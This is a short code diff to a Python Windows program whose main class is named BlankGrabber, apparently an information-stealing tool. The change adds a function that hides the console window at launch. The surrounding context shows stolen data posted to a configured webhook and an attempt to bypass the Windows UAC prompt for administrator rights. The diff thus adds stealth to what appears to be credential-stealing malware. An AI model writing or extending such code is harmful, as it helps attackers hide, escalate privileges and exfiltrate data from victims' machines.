@@ -165,6 +165,10 @@ class Syscalls:
             return bytes(data)
 
         raise ValueError("Invalid encrypted_data provided!")
+    
+    @staticmethod
+    def HideConsole() -> None: # Hides the console window
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 class Utility:
 
@@ -1467,6 +1471,8 @@ class BlankGrabber:
             http.request("POST", Settings.Webhook, fields= fields)
 
 if __name__ == "__main__" and os.name == "nt":
+    if Utility.GetSelf()[1]:
+        Syscalls.HideConsole() # Hides console (only for `Console: force` mode)
 
     if Utility.GetSelf()[1] and not Utility.IsAdmin() and not "--nouacbypass" in sys.argv:
         Utility.UACbypass() # Tries to bypass UAC Prompt (only for exe mode)
